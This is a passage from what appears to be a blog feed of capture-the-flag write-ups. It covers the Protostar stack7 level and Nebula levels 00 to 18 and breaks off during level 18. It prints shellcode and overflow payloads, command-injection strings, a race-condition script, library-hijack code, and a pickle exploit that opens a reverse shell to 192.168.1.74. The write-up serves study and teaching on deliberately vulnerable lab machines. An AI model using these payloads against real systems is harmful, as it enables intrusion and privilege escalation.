</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8 . "\xac\xf7\xff\xbf" . "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' &gt; /tmp/input
</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb ./stack7
</span><span class='line'>Reading symbols from /opt/protostar/bin/stack7...done.
</span><span class='line'>(gdb) r &lt; /tmp/input
</span><span class='line'>Starting program: /opt/protostar/bin/stack7 &lt; /tmp/input
</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� '�̀1�Ph//shh/bin��PS�ᙰ
</span><span class='line'>
</span><span class='line'>Executing new program: /bin/dash
</span><span class='line'>$ exit
</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack7 &lt; /tmp/input
</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� '�̀1�Ph//shh/bin��PS�ᙰ
</span><span class='line'>
</span><span class='line'>Segmentation fault
</span><span class='line'>user@protostar:/opt/protostar/bin$</span></code></pre></td></tr></table></div></figure>


<p>Where <code>\xac\xf7\xff\xbf</code> is the address of shellcode.  Instead I threw shellcode into an environmental variable and leveraged Jon Ericson&rsquo;s getenvaddr application to find the offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ export GETME=`perl -e 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
</span><span class='line'>user@protostar:/opt/protostar/bin$ /tmp/test GETME ./stack7
</span><span class='line'>GETME will be at 0xbfffff58
</span><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8 . "\x58\xff\xff\xbf"' &gt; /tmp/input
</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack7 &lt; /tmp/input 
</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA����������X���
</span><span class='line'># whoami
</span><span class='line'>root
</span><span class='line'># </span></code></pre></td></tr></table></div></figure>


<p>Overall these levels were pretty basic, but I&rsquo;m looking forward to digging into Fusion for more advanced flags.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nebula Solutions - All Levels]]></title>
    <link href="http://hatRiot.github.io/blog/2013/03/30/nebula-solutions-all-levels/"/>
    <updated>2013-03-30T23:46:33-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/03/30/nebula-solutions-all-levels</id>
    <content type="html"><![CDATA[<p>Nebula is the first of three exploit discs provided by <a href="http://exploit-exercises.com/">exploit exercises</a>.  I&rsquo;ve seen a couple walkthroughs of these levels around, but as a completionist, and for future reference, I&rsquo;ve cleaned my notes up a bit and am posting them here.  I will also post my notes for the other two systems sometime after.  This post includes a walkthrough of all 20 levels.</p>

<h3>Level 00</h3>


<p>Introduction level; requires the user to find a setuid file.  <code>find / -perm +6000 -type f -exec ls -ldh {} \; &gt; files.txt</code> and <code>cat files.txt | grep flag00</code> gives us two files, <code>/bin/.../flag00</code> and <code>/rofs/bin/.../flag00</code>.  Pick one and get your flag.</p>

<h3>Level 01</h3>


<p>First &ldquo;real&rdquo; level.  A binary with an environmental vulnerability; the source code given clearly lays out that its loading the users environment, and running echo with a string.  By modifying our environmental PATH, we can &ldquo;search&rdquo; for echo first in another directory and launch a shell.  <code>export PATH=/tmp:$PATH</code> to search for binaries in /tmp first, then create a shell script that launches bash.  Flag captured.</p>

<h3>Level 02</h3>


<p>Much like the previous level, this involves the manipulation of environmental variables.  Here it&rsquo;s pulling <code>$USER</code> and inserting it into a string to echo out.  Because we control this variable, we can terminate the string and execute a shell with the following: <code>export USER="test &amp;&amp; /bin/bash &amp;&amp; echo"</code>.  Launch the binary and capture the flag.</p>

<h3>Level 03</h3>


<p>This level has a crontab that runs every 5 minutes, and executes anything found in the local <code>writable.d</code> folder, then removes it.  It, surprise, runs as our flag.  If we shove a malicious script into the run folder that generates a shell executable for us, we should be able to suid it and capture our flag.  Generate a shell script with the following in writable.d:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'>gcc /tmp/shell.c -o /home/flag03/shell
</span><span class='line'>chmod +s /home/flag03/shell</span></code></pre></td></tr></table></div></figure>


<p>You&rsquo;ll just need to create <code>shell.c</code> in tmp and wait for it to run; I took the source code from level 1 and changed the system command to execute /bin/bash instead.  Execute <code>chmod +x</code> on run.sh and wait for your binary to be generated.  Once it is, execute it for your flag.  One thing to note is that it would be much easier to echo a shell script and suid that; alas, Linux prevents us from suid&#8217;ing scripts, <a href="http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html">and for very good reason</a>.</p>

<h3>Level 04</h3>


<p>Here we have another executable binary and a token file, which we must read.  The binary reads a name from stdin, checks if it&rsquo;s called &ldquo;token&rdquo; and if so, exits, otherwise it reads the file.  To circumvent this simple test, we can create a symbolic link to the token file and read that instead.  Executing <code>ln -s /home/flag04/token /tmp/test</code> allows us to then read /tmp/test and dump the token file.  In it is the password for flag04.</p>

<h3>Level 05</h3>


<p>This level aims to educate the user on directory permissions.  Browsing to <code>/home/flag05</code> and <code>ls -lAh</code> gives us several hidden folders, including a .backup folder with a tar file.  If we untar this, it appears to be a backup of flag05&rsquo;s ssh directory.  Copying the private key over will allow us to SSH in and capture our fifth flag.</p>

<h3>Level 06</h3>


<p>The informational page notes that this flag&rsquo;s credentials came from a legacy Unix system.  Executing <code>cat /etc/passwd | grep flag06</code> gives us a traditional DES encrypted password.  Loading this into john the ripper cracks the flag&rsquo;s password, giving us our sixth flag.</p>

<h3>Level 07</h3>


<p>Level 7 has a web server running on port 7007 that hosts a simple ping application.  No sanitation is performed on input, so obviously its prone to injection.  Leveraging the shell we wrote for level 3, we can simply generate a new shell script to compile and suid the binary.  By setting Host equal to <code>192.168.1.1 | sh /tmp/run2.sh</code>, we&rsquo;ll generate our shell and capture the flag.</p>

<h3>Level 08</h3>


<p>This level has a single pcap file with, likely. a password somewhere.  I scp&rsquo;d this off so I could parse it in Wireshark, but it could also be done using <code>tcpdump -qns 0 -X -r capture.pcap | more</code>.  Opening the pcap gives us a login attempt with a password backdoor&hellip;00Rm8.ate.  The periods are represented by <code>\x7f</code>, which just so happens to be backspace.  su to flag08 and capture the flag.</p>

<h3>Level 09</h3>


<p>This level requires some prerequisite knowledge of PHP and an edge-case vulnerability.  When <a href="http://php.net/manual/en/function.preg-replace.php">pre_replace</a> is used with the /e flag, the replacement string is substituted, evaluated, and replaced in the original string.  By looking at the PHP source code, we see the following <code>$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);</code>.  This regex matches the pattern <code>[email EMAIL]</code>, where EMAIL will be evaluated by the spam function, then eval&rsquo;d by PHP.  Notice the function takes two arguments, but only uses one; a clue, by any means.</p>

<p>In order to exploit this, we need to set the email portion of the regex to spawn us a shell.  This can be done with the following entry: <code>([email {${system($use_me)}}])</code>, where $use_me is $argv[2] to the executable.  Wrapping the command in <code>${system}</code> allows the PHP engine to interpret the command properly, and the extra pair of curly braces for escaping.  Pass in /bin/bash to capture your flag.</p>

<h3>Level 10</h3>


<p>Level 10 introduces a bit of networking; an application binary exists in the flag&rsquo;s folder, which reads a file and host from stdin and sends the file to the host over port 18211.  The binary first makes a call to access() to verify the user has adequate privileges; if not, a connection to the remote host is made and the file sent.  The vulnerability is a classic TOCTTOU (time of check to time of use); the application first checks if the user has access, then goes about creating a socket, making the connection, and sending the header.  With the following script, we can brute force the race condition:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'>unlink /tmp/token
</span><span class='line'>touch /tmp/token
</span><span class='line'>/home/flag10/flag10 /tmp/token 192.168.1.74 &
</span><span class='line'>rm -f /tmp/token
</span><span class='line'>ln -s /home/flag10/token /tmp/token</span></code></pre></td></tr></table></div></figure>


<p>I then started up a netcat listener on my remote host.  After about 30-40 iterations, I had flag 10&rsquo;s password.</p>

<h3>Level 11</h3>


<p>This is our first tricky level, I thought, that required a bit of leg work and thought.  The instructions state there are two ways to finish this level; I&rsquo;m assuming that&rsquo;s through one of two code paths present in the binary.  Essentially if our content header is &lt; 1024 we take the first transformation path, and if it&rsquo;s > 1024, we take the second.  The objective is to pass in already encrypted data that, when decrypted, can grab our flag.  If we send in encrypted data after a 1024 byte buffer, we can get decrypted commands to the system() call.  I wrote a small C application that runs the exact runtime from the given source and spits to stdout, which can then be piped to flag11 <code>./generate getflag | /home/flag11/flag11</code>.</p>

<h3>Level 12</h3>


<p>This level has a local telnet script listening on port 50001 that employs a lua script to handle all of its happenings.  The script accepts a password, hashes it, and checks it against a hard coded hash.  The vulnerability here is how it&rsquo;s actually verifying the password; the following line exemplifies the issue: <code>prog = io.popen("echo "..password.." | sha1sum", "r")</code>.  The listener receives input, and echo&rsquo;s it into sha1sum.  If we inject commands into our password, we should be able to snag the flag.  Executing <code>f | getflag &gt; /tmp/test | echo "test"</code> as a password should result in our flag when you <code>cat /tmp/test</code>.</p>

<h3>Level 13</h3>


<p>I was initially a little confused about the goal for this level; <code>cat /etc/passwd | grep 1000</code> returned the nebula account, which we &ldquo;technically&rdquo; don&rsquo;t know.  I then started looking for ways to preload a modified library, so we could override the getuid() call and just return 1000.  This led me <a href="http://www.ibm.com/developerworks/library/l-glibc/index.html">here</a>, which I was painlessly able to pull off:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level13@nebula: cat moduid.c
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>uid_t getuid(){ return 1000; }
</span><span class='line'>level13@nebula: gcc -shared -o moduid.so moduid.c
</span><span class='line'>level13@nebula: LD_PRELOAD=moduid.so ./flag13</span></code></pre></td></tr></table></div></figure>


<p>Running this dumps our token to stdout.  Another method may be modifying the binary itself, but I don&rsquo;t know how legal that is.  This was a neat vulnerability, and something I haven&rsquo;t run into before.</p>

<h3>Level 14</h3>


<p>Now I&rsquo;m convinced that running the binaries in a debugger is legal.  This level has a binary that only encrypts information; so, the objective here is to discover the encryption algorithm and write a complimentary decryption routine.  Playing around with the encryption tool allowed me to quickly discover what it was doing, without having to delve into assembly:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>abcdefg -&gt; acegikm
</span><span class='line'>a -&gt; a (idx + 0)
</span><span class='line'>b -&gt; c (idx + 1)
</span><span class='line'>c -&gt; e (idx + 2)
</span><span class='line'>d -&gt; g (idx + 3)
</span><span class='line'>e -&gt; i (idx + 4)
</span><span class='line'>f -&gt; k (idx + 5)
</span><span class='line'>g -&gt; m (idx + 6)</span></code></pre></td></tr></table></div></figure>


<p>So to reverse this, we just need to subtract the index.  I wrote a quick python script for doing this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>def decrypt(args):
</span><span class='line'>    ciph = args[2]
</span><span class='line'>    plain = ''
</span><span class='line'>    print 'Decrypting ', ciph
</span><span class='line'>    for idx in xrange(len(ciph)):
</span><span class='line'>        tmp = (ord(ciph[idx])-65)-idx
</span><span class='line'>        plain += chr(tmp+65)
</span><span class='line'>    print 'Decrypted: ', plain
</span><span class='line'>
</span><span class='line'>def encrypt(args):
</span><span class='line'>    plain = args[2]
</span><span class='line'>    ciph = ''
</span><span class='line'>    print 'Encrypting ', plain
</span><span class='line'>    for idx in xrange(len(plain)):
</span><span class='line'>        tmp = (ord(plain[idx])-65)+idx
</span><span class='line'>        ciph += chr(tmp+65)
</span><span class='line'>    print 'Encrypted: ', ciph
</span><span class='line'>
</span><span class='line'>if len(sys.argv) &lt; 2:
</span><span class='line'>    print '%s: [-d] [cipher] [-e] [plain]'%sys.argv[0]
</span><span class='line'>    sys.exit(1)
</span><span class='line'>
</span><span class='line'>if '-d' in sys.argv:
</span><span class='line'>    decrypt(sys.argv)
</span><span class='line'>elif '-e' in sys.argv:
</span><span class='line'>    encrypt(sys.argv)</span></code></pre></td></tr></table></div></figure>


<p>Now we just need to pass in the output of the encrypted token file to obtain our flag.</p>

<h3>Level 15</h3>


<p>If we strace flag15, we see a ton of access attempts to libc.so.6 in various folders in <code>/var/tmp/flag15</code>.  My first idea was to forgo the libc loading stuff and try wrapping the puts call and use the preload vulnerability again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/tmp$ cat wrapper.c
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>
</span><span class='line'>int __wrap_puts(const char *s){
</span><span class='line'>    system("/bin/getflag &gt; /tmp/flagged");
</span><span class='line'>    return puts(s);
</span><span class='line'>}
</span><span class='line'>level15@nebula:/tmp$ gcc -Wl,-wrap,write -shared -o /tmp/wrapper.so /tmp/wrapper.c
</span><span class='line'>level15@nebula:/tmp$ LD_PRELOAD=/tmp/wrapper.so ./flag15</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, the protection mechanism for preloading libraries catches us.  The loader will completely ignore the preloaded library if the RUID is not equal to the EUID and unlike level 13, we need to execute a binary, not simply obtain a token embedded in the binary.</p>

<p>So instead we need to compile a statically linked library and get it to call that library with whatever function it&rsquo;s using.  Object dumping the file, we find our main quite small:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ objdump -d -M intel flag15 
</span><span class='line'>[....]
</span><span class='line'>08048330 &lt;main&gt;:
</span><span class='line'> 8048330:  55                     push   %ebp
</span><span class='line'> 8048331:  89 e5                  mov    %esp,%ebp
</span><span class='line'> 8048333:  83 e4 f0               and    $0xfffffff0,%esp
</span><span class='line'> 8048336:  83 ec 10               sub    $0x10,%esp
</span><span class='line'> 8048339:  c7 04 24 d0 84 04 08   movl   $0x80484d0,(%esp)
</span><span class='line'> 8048340:  e8 bb ff ff ff         call   8048300 &lt;puts@plt&gt;
</span><span class='line'> 8048345:  c9                     leave  
</span><span class='line'> 8048346:  c3                     ret    
</span><span class='line'> 8048347:  90                     nop</span></code></pre></td></tr></table></div></figure>


<p>The only function it calls is puts, so we need to override that; we also need a target location.  <code>/var/tmp/flag15/libc.so.6</code> appears to be the least nested.  Here&rsquo;s the library code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ cat /tmp/lib.c
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>
</span><span class='line'>int puts(const char *s){
</span><span class='line'>  system("/bin/getflag &gt; /tmp/flagged");
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int __libc_start_main(int (*main)(int, char **, char **), 
</span><span class='line'>           int argc, char **argv,
</span><span class='line'>          void (*init)(void),
</span><span class='line'>          void (*fini)(void),
</span><span class='line'>          void (*rtld_fini)(void),
</span><span class='line'>          void (*stack_end))
</span><span class='line'>    { main(argc, argv, NULL);
</span><span class='line'>  return 0;
</span><span class='line'>}
</span><span class='line'>level15@nebula:/home/flag15$ </span></code></pre></td></tr></table></div></figure>


<p>We just need to compile and statically link this to the library path:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ gcc -Wall -fPIC -o /tmp/libc.o -c /tmp/lib.c
</span><span class='line'>/tmp/lib.c: In function ‘puts’:
</span><span class='line'>/tmp/lib.c:6:1: warning: control reaches end of non-void function [-Wreturn-type]
</span><span class='line'>level15@nebula:/home/flag15$ gcc -shared -W1,-Bstatic,-soname,libc.so.6 -o /var/tmp/flag15/libc.so.6 /tmp/libc.o -static
</span><span class='line'>level15@nebula:/home/flag15$ ./flag15
</span><span class='line'>./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
</span><span class='line'>./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
</span><span class='line'>./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __deregister_frame_info, version GLIBC_2.0 not defined in file libc.so.6 with link time reference</span></code></pre></td></tr></table></div></figure>


<p>This, <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker">apparently</a>, means that the library version number is lower on the shared object.  So we&rsquo;ll need to generate a version file and link it in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ cat /tmp/versionz 
</span><span class='line'>GLIBC_2.0{
</span><span class='line'>  __cxa_finalize;
</span><span class='line'>  __libc_start_main;
</span><span class='line'>  puts;
</span><span class='line'>};
</span><span class='line'>GLIBC_2.1.3 {
</span><span class='line'>}GLIBC_2.0;
</span><span class='line'>
</span><span class='line'>GLIBC_2.4{
</span><span class='line'>}GLIBC_2.0;
</span><span class='line'>level15@nebula:/home/flag15$ </span></code></pre></td></tr></table></div></figure>


<p>Recompile with &mdash;version-script=/tmp/versionz and&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ ./flag15
</span><span class='line'>Segmentation fault
</span><span class='line'>level15@nebula:/home/flag15$ cat /tmp/flagged
</span><span class='line'>You have successfully executed getflag on a target account
</span><span class='line'>level15@nebula:/home/flag15$</span></code></pre></td></tr></table></div></figure>




<h3>Level 16</h3>


<p>Level 16 has an HTTP server that hosts a simple CGI script.  In it, it parses off two parameters (username &amp; password) from the URL, then the username is converted to uppercase and everything after a space is stripped.  It then uses it as an argument to egrep:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>@output = `egrep "^$username" /home/flag16/userdb.txt 2&gt;&1`;</span></code></pre></td></tr></table></div></figure>


<p>This level took a bit of thought and a frustrating amount of tinkering; it&rsquo;s obvious where the vulnerability is, but it&rsquo;s not so obvious what we actually need to do.  All input is run through the two filters, so we&rsquo;ll need to either send in post-manipulated data that will be changed back when run, or some other voodoo that&rsquo;ll correctly be interpreted by bash and not touched by the filters.</p>

<p>The easiest, and shortest, command will be a script.  Normally, you wouldn&rsquo;t have access to the underlying host, but we do, so for now we&rsquo;ll take advantage of it.  I&#8221;ll admit I spent more time Googling around for this one than any of the previous; I happened to stumble into <a href="http://serverfault.com/questions/221318/bash-wildcard-expansion">this</a> Stack Overflow post about bash wildcard expansion:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level16@nebula:~$ pwd
</span><span class='line'>/tmp
</span><span class='line'>level16@nebula:~$ ls
</span><span class='line'>SHELL
</span><span class='line'>level16@nebula:~$ ls /*/SHELL
</span><span class='line'>/tmp/SHELL</span></code></pre></td></tr></table></div></figure>


<p>Wildcards aren&rsquo;t anything new, but I never knew that you could use it as such.  This means we need to have our username evaluated as <code>/*/shell</code>, so when it&rsquo;s expanded it&rsquo;ll be <code>/tmp/SHELL</code>.  The final result:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.206:1616/index.cgi?username=%22%60%2f*%2fshell%60%22&password=dolphin</span></code></pre></td></tr></table></div></figure>


<p>Add in a netcat call back to a script SHELL in tmp (see level 17) and it&rsquo;s game over.</p>

<h3>Level 17</h3>


<p>This level is yet another vulnerable listener, this time implemented in Python.  The vulnerability lies in the Pickle module, where one look at documentation gets you:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</span></code></pre></td></tr></table></div></figure>


<p>Because our input is never sanitized, we just need to send a specially crafted input string to be unpickled and execute malicious code.  <a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">This</a> Blackhat whitepaper came in handy when figuring out how the parsing engine worked, and once I had that figured out it was pretty easy:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
</span><span class='line'>
</span><span class='line'>cmd = "cos\nsystem\n(S'/bin/bash -i &gt; /dev/tcp/192.168.1.74/5555 0&gt;&1'\ntR.\n"
</span><span class='line'>try:
</span><span class='line'>    sock = socket.socket()
</span><span class='line'>    sock.connect(('192.168.1.206', 10007))
</span><span class='line'>    data = sock.recv(512)
</span><span class='line'>    print 'Got: ', data
</span><span class='line'>    sock.send(cmd)
</span><span class='line'>    sock.close()
</span><span class='line'>except Exception, e: print e</span></code></pre></td></tr></table></div></figure>


<p>I had a netcat shell listening on port 5555 for the call back.  I used this method because the Nebula box doesn&rsquo;t have netcat-traditional on it, which lacks the -e flag.  This is a neat way of opening a reverse shell without the fuss of named pipes.</p>

<h3>Level 18</h3>


<p>According to the level documentation, this can be completed in three different ways at three different difficulty levels.  The binary appears to be a hackney attempt at some sort of login program; with it, a user can &ldquo;login&rdquo; to elevate privileges, set user, do some debugging, and some other smaller things.  Immediately though I see a buffer overflow:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./flag18
</span><span class='line'>setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>*** buffer overflow detected ***: ./flag18 terminated
</span><span class='line'>======= Backtrace: =========
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xdbd8d5]
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0xdbc6d7]
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0xdbbd35]
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0xd41f91]
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0xd19305]
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0xdbbe09]
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xdbbd1f]
</span><span class='line'>./flag18[0x8048df5]
</span><span class='line'>./flag18[0x8048b1b]
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xcef113]
</span><span class='line'>./flag18[0x8048bb1]
</span><span class='line'>======= Memory map: ========
</span><span class='line'>00324000-00325000 r-xp 00000000 00:00 0          [vdso]
</span><span class='line'>00358000-00376000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>00376000-00377000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>00377000-00378000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
